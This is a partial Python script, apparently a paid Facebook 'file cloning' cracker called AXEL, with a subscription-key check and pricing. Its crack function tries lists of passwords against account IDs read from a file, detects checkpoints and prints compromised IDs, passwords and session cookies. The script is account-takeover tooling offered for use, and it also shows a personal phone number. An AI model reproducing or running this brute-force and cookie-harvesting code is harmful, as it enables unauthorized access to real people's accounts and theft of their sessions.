...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'Imon' and password == 'Nodi':
...
os.system('espeak -a 300 " Welcome,   to,  AXEL,  King,  Tools"')
os.system('xdg-open https://www.facebook.com/Tutul.King.Ok.Bro')
def banner():
	os.system("clear")
	print (f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
  ║\033[0;91m  db    Yb  dP 888888 88         88  dP 88 88b 88  dP""b8 
  ║\033[0;91m dPYb    YbdP  88__   88         88odP  88 88Yb88 dP   `" 
 ║\033[0;91m dP__Yb   dPYb  88""   88  .o     88"Yb  88 88 Y88 Yb  "88 
║\033[0;91m dP""""Yb dP  Yb 888888 88ood8     88  Yb 88 88  Y8  YboodP 
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m        [ WORKING MOBILE DATA AND WI-FI ]         \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mImon Shah ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Imon Shah ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mimonshah143 ]   ║\33[1;34m   
╠══[Whatsapp                 • 01612063812 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
╠══[VERSION                  • 10.6 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
	AXELj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	AXELj('\033[0;97m===============================================')
...
def crack_file():
	...
	print('\033[1;32m[ Put File Example:  /sdcard/Nodi.txt  Etc...]')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[AXEL-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#Imon-Tutul
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•AXEL-Cp] {idf} • {pw}')     
				...
				#Imon-Tutul
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•AXEL-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/imonshah143/AXEL.txt/blob/main/AXEL.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m AXEL, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+Imon+key1)
